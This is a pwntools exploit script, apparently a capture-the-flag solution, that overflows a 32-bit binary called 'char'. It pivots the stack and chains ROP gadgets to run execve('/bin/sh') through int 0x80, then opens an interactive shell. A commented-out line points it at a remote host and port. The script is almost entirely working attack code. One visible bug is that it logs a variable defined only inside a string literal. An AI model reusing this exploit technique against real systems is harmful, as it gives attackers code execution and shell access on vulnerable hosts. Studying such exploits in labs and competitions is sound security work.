from pwn import *

#context.log_level = 'debug'
base = 0x5555e000
#0x0001706b : pop eax ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret
int80 = 0x00B7E36    
'''           
pop5_ret = 0x0001706b
ret80 = 0x00132d35
ret52 = 0x00004234
pop4_ret10 = 0x00017e76
add_esp9c_ret = 0x000e3cee
add_esp98_pop_ret = 0x0011cf7a
'''   
mov_eax_ecx = 0x00148251        # 1. add byte ptr [eax] , al ; mov eax,ecx ; ret 
xchg_esp_eax = 0x000e6d62       # 2. xchg eax,esp ; ret 0xb
add_esp1c_ret = 0x00115f35      # 3. push esp;and al,0x24;add esp,0x1c;ret;
p = process('./char')
#p = remote('202.120.7.214', 23222)
ebx_ret = 0x0007dce9            # 4. xor eax,eax;pop ebx;ret;
'''
edx_ecx_eax_ret = 0x000f277f
scanf_plt = 0x08048540
pop2_ret = 0x804889a
s2400 = 0x804894C
data = 0x804A03C
system_addr = 0x003EED0 + base
execve_addr = 0x0003ECF2 + base
eax_ret = 0x0016a7d4 + base
pop3_ret = 0x8048899
binsh = 0x556bb7ec
main_addr = 0x08048693
write_plt = 0x8048520
write_got = 0x804A030
puts_plt = 0x80484B0
scanf_got = 0x804A038
strcpy_got = 0x0804A010
strcpy_plt = 0x080484A0
libc_start_main_got = 0x804A00C + 4
'''
edx_ret = 0x00001a9e + base      #5. pop edx;ret;
ecx_ret = 0x000cae3b + base      #6. pop ecx;ret;
inc_eax_ret = 0x00026a9b + base  #7. inc eax;ret;
log.info(hex(write_plt))
payload  = ''
payload += 'A' * 28
payload += p32(add_esp1c_ret + base)
payload += p32(mov_eax_ecx + base)
payload += p32(xchg_esp_eax + base)
payload += '\x00' * 3
payload += p32(0xdeadbeef)
payload += p32(0xdeadbeef) * 5
payload += p32(ebx_ret + base)
payload += p32(binsh)
payload += p32(edx_ret)
payload += p32(0x00)
payload += p32(ecx_ret)
payload += p32(0x00)
for i in range(11):
	payload += p32(inc_eax_ret)
payload += p32(int80 + base)
pause()
log.info(len(payload))
p.recvuntil('GO : ) \n')
p.send(payload + '\n')
p.interactive()

